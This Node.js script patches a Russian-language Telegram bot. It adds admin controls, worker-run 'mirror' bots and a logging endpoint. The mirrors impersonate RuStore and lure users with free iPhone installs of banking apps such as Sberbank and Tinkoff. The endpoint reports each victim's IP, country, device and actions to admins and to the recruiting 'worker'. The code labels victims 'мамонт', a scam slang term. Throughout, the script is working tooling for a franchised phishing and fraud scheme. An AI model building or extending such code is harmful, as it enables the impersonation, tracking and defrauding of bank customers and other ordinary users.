const fs = require('fs');
let botJs = fs.readFileSync('bot.js', 'utf8');

const newSendMainMenu = `
function sendMainMenu(ctx) {
    const text = "Привет! Я бот для управления приложениями.\\nВыберите действие:";
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('➕ Добавить приложение', 'add_app')],
        [Markup.button.callback('📋 Мои приложения', 'list_apps')],
        [Markup.button.callback('⚙️ Настройки', 'settings')],
        [Markup.button.callback('💬 Диалоги поддержки', 'view_chats')],
        [Markup.button.callback('👮 Управление админами', 'manage_admins')],
        [Markup.button.callback('🪞 Управление зеркалами', 'manage_mirrors')]
    ]);
    if (ctx.callbackQuery) {
        ctx.editMessageText(text, keyboard).catch(() => ctx.reply(text, keyboard));
    } else {
        ctx.reply(text, keyboard);
    }
}
`;
botJs = botJs.replace(/function sendMainMenu\(ctx\) \{[\s\S]*?\n\}/, newSendMainMenu.trim());

const oldBotStart = `
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL)],
        [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')]
    ]);
`;
const newBotStart = `
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL)],
        [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')],
        [Markup.button.callback('🤖 Моё зеркало', 'worker_mirror')]
    ]);
`;
botJs = botJs.replace(oldBotStart.trim(), newBotStart.trim());

const mirrorLogic = `
app.use(express.json());

app.post('/api/log', async (req, res) => {
    const { workerId, msg, user_info, action } = req.body;
    const username = user_info.username ? '@' + user_info.username : user_info.id;
    const deviceInfo = user_info.device || 'Неизвестно';
    const loc = (user_info.country || 'Н/Д') + ' / ' + (user_info.ip || 'Н/Д');
    
    const workerUsername = (mirrors[workerId] && mirrors[workerId].username) ? '@' + mirrors[workerId].username : workerId;
    const botUsername = (mirrors[workerId] && mirrors[workerId].botUsername) ? '@' + mirrors[workerId].botUsername : 'Основной бот';
    const adminMsg = \`❗️ <b>Лог</b>\\nМамонт (\${username}) совершил действие: <b>\${action}</b>\\n📍 \${loc} | 💻 \${deviceInfo}\\n🤖 Зеркало: \${botUsername}\\n👤 Воркер: \${workerUsername}\\n\\n💬 <i>\${msg}</i>\`;
    await notifyAllAdmins(adminMsg, { parse_mode: 'HTML' });
    
    if (workerId && workerId !== 'null' && workerId !== '8482944892') {
        const workerMsg = \`❗️ <b>Ваш мамонт (\${username})</b>: \${action}\\n📍 \${loc} | 💻 \${deviceInfo}\\n\\n💬 <i>\${msg}</i>\`;
        try {
            await bot.telegram.sendMessage(workerId, workerMsg, { parse_mode: 'HTML' });
        } catch(e) {}
    }
    res.send('ok');
});

let runningMirrors = {};

function startMirror(workerId, token, botUsername) {
    if (runningMirrors[workerId]) return;
    const mirrorBot = new Telegraf(token);
    mirrorBot.start(async (ctx) => {
        if (ctx.from.username && mirrors[workerId]) {
            mirrors[workerId].username = ctx.from.username;
            saveMirrors();
        }
        
        const text = \`❌ Проблема с установкой приложений на iPhone для работы и повседневной жизни?\\n\\n🎁 Ничего страшного, ведь наш сервис бесплатно помогает устанавливать все это!\\n\\n📱 Доступные приложения и игры:\\n🏦 Сбербанк, Тинькофф, Альфа Банк и другие банки\\n🎮 Toca Boca, Minecraft и еще множество игр!\\n👑 CapCut Pro, Picsart Gold\\n✨ И многое другое!\`;
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL + '?worker=' + workerId)],
            [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')]
        ]);
        try {
            await ctx.replyWithPhoto({ source: 'start_image.jpg' }, { caption: text, parse_mode: 'HTML', reply_markup: keyboard.reply_markup });
        } catch (e) {
            await ctx.reply(text, keyboard);
        }
    });
    mirrorBot.launch().catch(e => console.error("Mirror launch error:", e));
    runningMirrors[workerId] = mirrorBot;
}

for (let wid in mirrors) {
    startMirror(wid, mirrors[wid].token, mirrors[wid].botUsername);
}

bot.action('worker_mirror', (ctx) => {
    if (globalSettings.mirrorsEnabled === false) {
        if (!globalSettings.mirrorWhitelist || !globalSettings.mirrorWhitelist.includes(ctx.chat.id.toString())) {
            return ctx.reply("❌ Создание зеркал сейчас закрыто администрацией.");
        }
    }
    if (mirrors[ctx.chat.id]) {
        return ctx.reply(\`✅ Ваше зеркало уже работает: @\${mirrors[ctx.chat.id].botUsername}\`, Markup.inlineKeyboard([
            [Markup.button.callback('🗑 Удалить зеркало', 'delete_my_mirror')]
        ]));
    }
    userState[ctx.chat.id] = { step: 'mirror_token' };
    ctx.reply("Отправьте токен вашего бота (от @BotFather):");
});

bot.action('delete_my_mirror', (ctx) => {
    const k = ctx.chat.id.toString();
    if (runningMirrors[k]) {
        runningMirrors[k].stop();
        delete runningMirrors[k];
    }
    delete mirrors[k];
    saveMirrors();
    ctx.reply("Ваше зеркало удалено!");
});

// Admin panel actions
bot.action('manage_admins', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const msg = "👮 **Управление админами**\\nТекущие админы: " + admins.join(', ');
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('➕ Добавить админа', 'add_admin')],
        [Markup.button.callback('➖ Удалить админа', 'remove_admin')],
        [Markup.button.callback('🔙 Назад', 'back_start')]
    ]);
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: keyboard.reply_markup });
});
bot.action('add_admin', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    userState[ctx.chat.id] = { step: 'input_add_admin' };
    ctx.reply("Введите Chat ID нового администратора:");
});
bot.action('remove_admin', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    userState[ctx.chat.id] = { step: 'input_remove_admin' };
    ctx.reply("Введите Chat ID администратора для удаления:");
});
bot.action('manage_mirrors', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const msg = "🪞 **Управление зеркалами**\\n\\nВсего зеркал: " + Object.keys(mirrors).length + "\\nДоступ: " + (globalSettings.mirrorsEnabled === false ? "Только Whitelist" : "Открыт всем");
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback(globalSettings.mirrorsEnabled === false ? '🔓 Открыть для всех' : '🔒 Закрыть (Whitelist)', 'toggle_mirrors')],
        [Markup.button.callback('➕ Добавить в Whitelist', 'add_whitelist')],
        [Markup.button.callback('📋 Список зеркал', 'list_mirrors')],
        [Markup.button.callback('🔙 Назад', 'back_start')]
    ]);
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: keyboard.reply_markup });
});
bot.action('toggle_mirrors', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    globalSettings.mirrorsEnabled = (globalSettings.mirrorsEnabled === false) ? true : false;
    saveSettings();
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: 'manage_mirrors' } });
});
bot.action('add_whitelist', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    userState[ctx.chat.id] = { step: 'input_whitelist' };
    ctx.reply("Введите Chat ID воркера для выдачи доступа:");
});
bot.action('list_mirrors', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const keys = Object.keys(mirrors);
    if (keys.length === 0) return ctx.reply("Зеркал пока нет.");
    const buttons = keys.map(k => [Markup.button.callback(\`@\${mirrors[k].botUsername} (\${mirrors[k].username})\`, \`view_mirror_\${k}\`)]);
    ctx.editMessageText("📋 **Список зеркал:**", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } });
});
bot.action(/view_mirror_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    const m = mirrors[k];
    if (!m) return ctx.reply("Зеркало не найдено.");
    const msg = \`🪞 Зеркало: @\${m.botUsername}\\n👤 Воркер: @\${m.username} (ID: \${k})\\n🛠 Права на свои приложения: \${m.canAddApps ? '✅ Да' : '❌ Нет'}\`;
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback(m.canAddApps ? '❌ Забрать права на приложения' : '✅ Выдать права на приложения', \`toggle_app_rights_\${k}\`)],
        [Markup.button.callback('🗑 Удалить зеркало', \`delete_mirror_\${k}\`)],
        [Markup.button.callback('🔙 К списку', 'list_mirrors')]
    ]);
    ctx.editMessageText(msg, { reply_markup: keyboard.reply_markup });
});
bot.action(/toggle_app_rights_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    if (mirrors[k]) {
        mirrors[k].canAddApps = !mirrors[k].canAddApps;
        saveMirrors();
        if (mirrors[k].canAddApps) {
            bot.telegram.sendMessage(k, "✅ Администратор выдал вам права на добавление собственных приложений в ваше зеркало! Нажмите /start и перейдите в добавление.").catch(()=>{});
        }
    }
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: \`view_mirror_\${k}\` } });
});
bot.action(/delete_mirror_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    if (runningMirrors[k]) {
        runningMirrors[k].stop();
        delete runningMirrors[k];
    }
    delete mirrors[k];
    saveMirrors();
    ctx.answerCbQuery("Зеркало удалено!");
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: 'list_mirrors' } });
});

botJs = botJs.replace(/combinedServer\.listen\\(8080/, mirrorLogic + '\\n$&');

const textLogic = \`
    if (state && state.step === 'input_add_admin') {
        const id = ctx.message.text.trim();
        if (!admins.includes(id)) {
            admins.push(id);
            saveAdmins();
            bot.telegram.sendMessage(id, "🎉 Вам выданы права администратора! Нажмите /admin").catch(()=>{});
        }
        ctx.reply("✅ Админ добавлен!");
        delete userState[ctx.chat.id];
        return;
    }
    if (state && state.step === 'input_remove_admin') {
        const id = ctx.message.text.trim();
        admins = admins.filter(a => a !== id);
        saveAdmins();
        ctx.reply("✅ Админ удален!");
        delete userState[ctx.chat.id];
        return;
    }
    if (state && state.step === 'input_whitelist') {
        const id = ctx.message.text.trim();
        globalSettings.mirrorWhitelist = globalSettings.mirrorWhitelist || [];
        if (!globalSettings.mirrorWhitelist.includes(id)) {
            globalSettings.mirrorWhitelist.push(id);
            saveSettings();
        }
        ctx.reply("✅ Воркер добавлен в белый список!");
        delete userState[ctx.chat.id];
        return;
    }
    if (state && state.step === 'mirror_token') {
        const token = ctx.message.text.trim();
        try {
            const testBot = new Telegraf(token);
            const botInfo = await testBot.telegram.getMe();
            mirrors[ctx.chat.id] = {
                token: token,
                botUsername: botInfo.username,
                username: ctx.from.username || ctx.from.first_name,
                canAddApps: false
            };
            saveMirrors();
            startMirror(ctx.chat.id, token, botInfo.username);
            delete userState[ctx.chat.id];
            await notifyAllAdmins(\`🆕 Воркер @\${ctx.from.username || ctx.from.id} создал зеркало: @\${botInfo.username}\`);
            ctx.reply(\`✅ Зеркало успешно запущено! Бот: @\${botInfo.username}\\nТеперь ваши мамонты могут писать туда, и логи придут вам!\`);
        } catch(e) {
            ctx.reply("❌ Неверный токен. Попробуйте еще раз или напишите /start для отмены.");
        }
        return;
    }
\`;

botJs = botJs.replace(/bot\\.on\\('text', async \\(ctx, next\\) => \\{/, \`$&\\n\${textLogic}\`);

fs.writeFileSync('bot.js', botJs, 'utf8');
console.log('Bot fully patched');
